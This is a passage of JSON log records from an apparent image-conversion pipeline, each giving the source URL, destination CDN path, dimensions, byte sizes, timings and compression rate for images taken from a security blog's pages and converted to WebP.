KB","compressRate":"107.2%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/015d6bdd-dbfa-45a5-9085-bd0fe5343076.png-w331s","sourceStatusCode":200,"destWidth":1339,"destHeight":568,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn34@2020_2/2020/08/24/21-14-53-945_335d24840c3fb979.webp","sourceBytes":37909,"destBytes":48648,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2574,"convertSpendMs":29,"createdTime":"2020-08-25 05:14:52","host":"us-004*","referer":"https://blog.knownsec.com/?p=5013","linkMd5ListStr":"c8d4535c12d7f5a007abcd8ebe8e7714","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"37 KB","destSize":"47.5 KB","compressRate":"128.3%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/291ea879-e6dd-46a6-af48-4dd927485670.png-w331s","sourceStatusCode":200,"destWidth":1199,"destHeight":453,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn74@2020_5/2020/08/24/21-14-53-962_4e8c43d6d4205a63.webp","sourceBytes":62221,"destBytes":75538,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2577,"convertSpendMs":69,"createdTime":"2020-08-25 05:14:52","host":"us-005*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"60.8 KB","destSize":"73.8 KB","compressRate":"121.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/ae52a1ad-c092-427f-b647-7dbd0c085906.png-w331s","sourceStatusCode":200,"destWidth":1161,"destHeight":545,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn77@2020_4/2020/08/24/21-14-53-833_211850a3860bdff1.webp","sourceBytes":173241,"destBytes":25452,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2490,"convertSpendMs":26,"createdTime":"2020-08-25 05:14:52","host":"europe68*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"169.2 KB","destSize":"24.9 KB","compressRate":"14.7%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/dd424e1f-4853-4f7f-943d-dc0529a258ea.png-w331s","sourceStatusCode":200,"destWidth":1108,"destHeight":623,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn47@2020_5/2020/08/24/21-14-53-842_fd5ea3217e193d5e.webp","sourceBytes":58545,"destBytes":67236,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2721,"convertSpendMs":27,"createdTime":"2020-08-25 05:14:52","host":"us-032*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"57.2 KB","destSize":"65.7 KB","compressRate":"114.8%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/7b9cae35-a1a4-4f89-a96f-8d5e8430f4a4.png-w331s","sourceStatusCode":200,"destWidth":1844,"destHeight":813,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn26@2020_2/2020/08/24/21-14-53-544_e17eee3920b07d19.webp","sourceBytes":107549,"destBytes":139734,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2704,"convertSpendMs":64,"createdTime":"2020-08-25 05:14:52","host":"europe-22*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"105 KB","destSize":"136.5 KB","compressRate":"129.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/723592aa-a48e-42a7-bcad-7399760a1f69.png-w331s","sourceStatusCode":200,"destWidth":1586,"destHeight":919,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn46@2020_6/2020/08/24/21-14-54-185_a8e079cff83edab7.webp","sourceBytes":82548,"destBytes":132062,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1479,"convertSpendMs":63,"createdTime":"2020-08-25 05:14:53","host":"us-001*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"80.6 KB","destSize":"129 KB","compressRate":"160%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/3cabfcff-59f9-462e-9535-c2e8ea2a34e9.png-w331s","sourceStatusCode":200,"destWidth":2170,"destHeight":1300,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn43@2020_2/2020/08/24/21-14-54-157_c3cda1a7b177e3d6.webp","sourceBytes":207862,"destBytes":98102,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2903,"convertSpendMs":138,"createdTime":"2020-08-25 05:14:52","host":"us-036*","referer":"https://blog.knownsec.com/?p=5037","linkMd5ListStr":"23161d8db2ce524c7b61906d36af8d85","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"203 KB","destSize":"95.8 KB","compressRate":"47.2%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/33e67c1a-6191-428a-a780-4d8d76f481db.png-w331s","sourceStatusCode":200,"destWidth":1069,"destHeight":694,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn89@2020_5/2020/08/24/21-14-54-128_2491489af176215c.webp","sourceBytes":47531,"destBytes":81296,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2950,"convertSpendMs":124,"createdTime":"2020-08-25 05:14:52","host":"us-021*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"46.4 KB","destSize":"79.4 KB","compressRate":"171%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/67911b32-817c-42b8-840d-19500d314a22.png-w331s","sourceStatusCode":200,"destWidth":1870,"destHeight":836,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn42@2020_2/2020/08/24/21-14-54-249_0e840df400da224b.webp","sourceBytes":97709,"destBytes":103148,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1536,"convertSpendMs":78,"createdTime":"2020-08-25 05:14:53","host":"us-013*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"95.4 KB","destSize":"100.7 KB","compressRate":"105.6%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/c933d3c8-6f70-4622-b898-8d21d0a17bba.png-w331s","sourceStatusCode":200,"destWidth":989,"destHeight":151,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn38@2020_1/2020/08/24/21-14-54-038_c3112e8d9f18ee53.webp","sourceBytes":13919,"destBytes":15852,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1593,"convertSpendMs":8,"createdTime":"2020-08-25 05:14:53","host":"us-025*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"13.6 KB","destSize":"15.5 KB","compressRate":"113.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/157bdb00-8427-4db7-92fe-38d62ecfeb17.png-w331s","sourceStatusCode":200,"destWidth":1863,"destHeight":792,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn4@2020_5/2020/08/24/21-14-54-244_2693725753505ba9.webp","sourceBytes":102501,"destBytes":103344,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3019,"convertSpendMs":71,"createdTime":"2020-08-25 05:14:52","host":"us-011*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"100.1 KB","destSize":"100.9 KB","compressRate":"100.8%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/9ab3dc59-053e-4cf1-8025-52c742ea4426.png-w331s","sourceStatusCode":200,"destWidth":2876,"destHeight":1462,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn30@2020_2/2020/08/24/21-14-53-886_ffd12ab6e63358fe.webp","sourceBytes":268163,"destBytes":142004,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1769,"convertSpendMs":109,"createdTime":"2020-08-25 05:14:53","host":"europe-60*","referer":"https://blog.knownsec.com/?p=5011","linkMd5ListStr":"46ed8d4650000d45c0ea25a3a8b571e6","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"261.9 KB","destSize":"138.7 KB","compressRate":"53%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/1a6ed295-a594-4599-8a84-cf6ed6ac03d7.png-w331s","sourceStatusCode":200,"destWidth":1840,"destHeight":831,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn35@2020_3/2020/08/24/21-14-53-903_6d5b1ef2746024d9.webp","sourceBytes":98571,"destBytes":107552,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3010,"convertSpendMs":49,"createdTime":"2020-08-25 05:14:52","host":"europe67*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"96.3 KB","destSize":"105 KB","compressRate":"109.1%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/a03dc11e-9383-4b38-8a3f-deb62c8020e9.png-w331s","sourceStatusCode":200,"destWidth":1378,"destHeight":958,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn85@2020_2/2020/08/24/21-14-54-342_f8ee337dc8113013.webp","sourceBytes":510798,"destBytes":180126,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3144,"convertSpendMs":74,"createdTime":"2020-08-25 05:14:52","host":"us-034*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"498.8 KB","destSize":"175.9 KB","compressRate":"35.3%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/ffe5ae14-c22a-40e9-8747-3cd2e961b5f3.png-w331s","sourceStatusCode":200,"destWidth":848,"destHeight":479,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn57@2020_4/2020/08/24/21-14-54-297_95a8d09e94e6ec65.webp","sourceBytes":103437,"destBytes":32394,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1582,"convertSpendMs":41,"createdTime":"2020-08-25 05:14:53","host":"us-029*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"101 KB","destSize":"31.6 KB","compressRate":"31.3%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/32467390-67b4-401c-84b7-bce8b36c04b5.png-w331s","sourceStatusCode":200,"destWidth":815,"destHeight":597,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn78@2020_3/2020/08/24/21-14-54-584_d11c3b16c46efe01.webp","sourceBytes":11319,"destBytes":20752,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1269,"convertSpendMs":17,"createdTime":"2020-08-25 05:14:54","host":"us-034*","referer":"https://blog.knownsec.com/?p=5037","linkMd5ListStr":"23161d8db2ce524c7b61906d36af8d85","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"11.1 KB","destSize":"20.3 KB","compressRate":"183.3%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/114aad47-e011-497b-9b83-182716c8fdd6.png-w331s","sourceStatusCode":200,"destWidth":1003,"destHeight":433,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn14@2020_5/2020/08/24/21-14-54-506_6db1e9ca0cd62602.webp","sourceBytes":50098,"destBytes":65400,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3240,"convertSpendMs":194,"createdTime":"2020-08-25 05:14:52","host":"us-020*","referer":"https://blog.knownsec.com/?p=5022","linkMd5ListStr":"3be24b3dafcda97d2cd1d8bdc8240c69","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"48.9 KB","destSize":"63.9 KB","compressRate":"130.5%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/56d63d18-aa30-4fbf-93eb-c6bc79bca824.png-w331s","sourceStatusCode":200,"destWidth":1144,"destHeight":833,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn51@2020_1/2020/08/24/21-14-54-519_8a9115724c6ae261.webp","sourceBytes":66395,"destBytes":96090,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3319,"convertSpendMs":195,"createdTime":"2020-08-25 05:14:52","host":"us-020*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx23","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"64.8 KB","destSize":"93.8 KB","compressRate":"144.7%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/2c1569a3-1e83-4e1c-9320-3aa08564caae.png-w331s","sourceStatusCode":200,"destWidth":1884,"destHeight":1028,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn54@2020_4/2020/08/24/21-14-54-535_ad346f38dec1cd96.webp","sourceBytes":167577,"destBytes":183452,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1831,"convertSpendMs":136,"createdTime":"2020-08-25 05:14:53","host":"us-52*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"163.6 KB","destSize":"179.2 KB","compressRate":"109.5%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/8c8e7426-63bd-440c-b502-4e435fba6752.png-w331s","sourceStatusCode":200,"destWidth":951,"destHeight":261,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn9@2020_4/2020/08/24/21-14-54-353_f2f1fdb5ebeff47b.webp","sourceBytes":17085,"destBytes":21422,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3273,"convertSpendMs":11,"createdTime":"2020-08-25 05:14:52","host":"europe-56*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"16.7 KB","destSize":"20.9 KB","compressRate":"125.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/9f67b723-b0db-4b60-a45b-89607faef2b9.png-w331s","sourceStatusCode":200,"destWidth":1847,"destHeight":821,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn65@2020_1/2020/08/24/21-14-54-584_daf7d174252036f3.webp","sourceBytes":100185,"destBytes":120602,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1639,"convertSpendMs":138,"createdTime":"2020-08-25 05:14:54","host":"us-005*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx23","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"97.8 KB","destSize":"117.8 KB","compressRate":"120.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/e95504be-605c-4b56-a4b1-6cf2ec62b4cf.png-w331s","sourceStatusCode":200,"destWidth":921,"destHeight":260,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn49@2020_2/2020/08/24/21-14-54-583_f40aadf888ef49a8.webp","sourceBytes":12135,"destBytes":39068,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1904,"convertSpendMs":12,"createdTime":"2020-08-25 05:14:53","host":"europe64*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"11.9 KB","destSize":"38.2 KB","compressRate":"321.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/f523f88c-6e76-457c-a1b0-9fdbbb852a05.png-w331s","sourceStatusCode":200,"destWidth":1372,"destHeight":447,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn59@2020_4/2020/08/24/21-14-54-603_45a9ae87fa1b5e82.webp","sourceBytes":46055,"destBytes":50670,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3392,"convertSpendMs":20,"createdTime":"2020-08-25 05:14:52","host":"europe21*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"45 KB","destSize":"49.5 KB","compressRate":"110%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/8bb0294d-7cb2-4662-938d-43360d3ec1ec.png-w331s","sourceStatusCode":200,"destWidth":554,"destHeight":114,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn9@2020_5/2020/08/24/21-14-55-014_b5d9eca33e9e0589.webp","sourceBytes":40414,"destBytes":16424,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1042,"convertSpendMs":7,"createdTime":"2020-08-25 05:14:54","host":"us-001*","referer":"https://blog.knownsec.com/?p=5022","linkMd5ListStr":"3be24b3dafcda97d2cd1d8bdc8240c69","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"39.5 KB","destSize":"16 KB","compressRate":"40.6%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/03/48e5f32e-6812-4839-9e18-fc2c3a76cd7e.png-w331s","sourceStatusCode":200,"destWidth":1556,"destHeight":458,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn1@2020_3/2020/08/24/21-14-54-985_a5ea29f1cd3f4b10.webp","sourceBytes":130164,"destBytes":82830,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1198,"convertSpendMs":30,"createdTime":"2020-08-25 05:14:54","host":"us-025*","referer":"https://blog.knownsec.com/?p=5031","linkMd5ListStr":"4b26291a0ec99cf126b9bcc0d9c59c35","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"127.1 KB","destSize":"80.9 KB","compressRate":"63.6%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/6a0de531-9634-485b-82e5-9446689bff9b.png-w331s","sourceStatusCode":200,"destWidth":1848,"destHeight":745,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn98@2020_4/2020/08/24/21-14-55-005_32fc129f1bad4034.webp","sourceBytes":79103,"destBytes":85260,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1238,"convertSpendMs":67,"createdTime":"2020-08-25 05:14:54","host":"us-038*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"77.2 KB","destSize":"83.3 KB","compressRate":"107.8%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/e95cd253-be42-413c-89b4-8a6dde233c59.png-w331s","sourceStatusCode":200,"destWidth":1620,"destHeight":659,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn2@2020_5/2020/08/24/21-14-54-641_0767e9ff5b2236f2.webp","sourceBytes":118882,"destBytes":41580,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3605,"convertSpendMs":35,"createdTime":"2020-08-25 05:14:52","host":"europe67*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"116.1 KB","destSize":"40.6 KB","compressRate":"35%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/ee24d6df-cd81-4a21-9e66-bef5a87f5c02.png-w331s","sourceStatusCode":200,"destWidth":1553,"destHeight":483,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn4@2020_5/2020/08/24/21-14-54-678_75fe4e33b2a34715.webp","sourceBytes":53838,"destBytes":68410,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3665,"convertSpendMs":31,"createdTime":"2020-08-25 05:14:52","host":"europe68*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"52.6 KB","destSize":"66.8 KB","compressRate":"127.1%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/5eff612d-dbeb-476e-97d6-60027fb1301c.png-w331s","sourceStatusCode":200,"destWidth":1847,"destHeight":826,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn81@2020_3/2020/08/24/21-14-54-548_22b6f1342c1fcd89.webp","sourceBytes":92819,"destBytes":103966,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3794,"convertSpendMs":56,"createdTime":"2020-08-25 05:14:52","host":"europe-56*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"90.6 KB","destSize":"101.5 KB","compressRate":"112%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/749bc734-fa59-4a68-8349-cbef16fbb0bd.png-w331s","sourceStatusCode":200,"destWidth":1839,"destHeight":804,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn85@2020_2/2020/08/24/21-14-55-150_663d34000a54d42c.webp","sourceBytes":103900,"destBytes":132554,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1762,"convertSpendMs":161,"createdTime":"2020-08-25 05:14:54","host":"us-009*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"101.5 KB","destSize":"129.4 KB","compressRate":"127.6%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/83109995-979e-4d21-bc50-99267b1f4252.png-w331s","sourceStatusCode":200,"destWidth":925,"destHeight":276,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn73@2020_6/2020/08/24/21-14-54-834_d12e3353783a8e4f.webp","sourceBytes":104108,"destBytes":32122,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1902,"convertSpendMs":13,"createdTime":"2020-08-25 05:14:54","host":"europe-56*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"101.7 KB","destSize":"31.4 KB","compressRate":"30.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/c7198bce-44be-46eb-9a02-6f1bcd0badbc.png-w331s","sourceStatusCode":200,"destWidth":954,"destHeight":720,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn5@2020_4/2020/08/24/21-14-55-360_c5668405728bbbfd.webp","sourceBytes":40113,"destBytes":42952,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1443,"convertSpendMs":75,"createdTime":"2020-08-25 05:14:54","host":"us-013*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"39.2 KB","destSize":"41.9 KB","compressRate":"107.1%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/4b8dbfd7-0c6f-425b-ba1a-9b267696bcea.png-w331s","sourceStatusCode":200,"destWidth":667,"destHeight":387,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn94@2020_6/2020/08/24/21-14-54-989_06928b5d92b302bf.webp","sourceBytes":9900,"destBytes":72056,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1566,"convertSpendMs":16,"createdTime":"2020-08-25 05:14:54","host":"europe-60*","referer":"https://blog.knownsec.com/?p=5022","linkMd5ListStr":"3be24b3dafcda97d2cd1d8bdc8240c69","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"9.7 KB","destSize":"70.4 KB","compressRate":"727.8%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/b3b938da-b060-4ecb-9380-bc08fe051072.png-w331s","sourceStatusCode":200,"destWidth":1357,"destHeight":790,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn14@2020_1/2020/08/24/21-14-55-163_c48d0312bba3b725.webp","sourceBytes":229580,"destBytes":70744,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1493,"convertSpendMs":34,"createdTime":"2020-08-25 05:14:54","host":"europe64*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"224.2 KB","destSize":"69.1 KB","compressRate":"30.8%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/76977519-5dc6-48ea-945d-cb3effed6504.png-w331s","sourceStatusCode":200,"destWidth":1137,"destHeight":854,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn21@2020_2/2020/08/24/21-14-55-484_0c3e979551b97b3b.webp","sourceBytes":309775,"destBytes":95152,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1607,"convertSpendMs":59,"createdTime":"2020-08-25 05:14:54","host":"us-029*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"302.5 KB","destSize":"92.9 KB","compressRate":"30.7%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/2b361b21-f6c9-438a-8f1f-aac90656e6be.png-w331s","sourceStatusCode":200,"destWidth":559,"destHeight":1099,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn90@2020_6/2020/08/24/21-14-55-284_07c3a12de6e7923a.webp","sourceBytes":108408,"destBytes":34854,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1905,"convertSpendMs":31,"createdTime":"2020-08-25 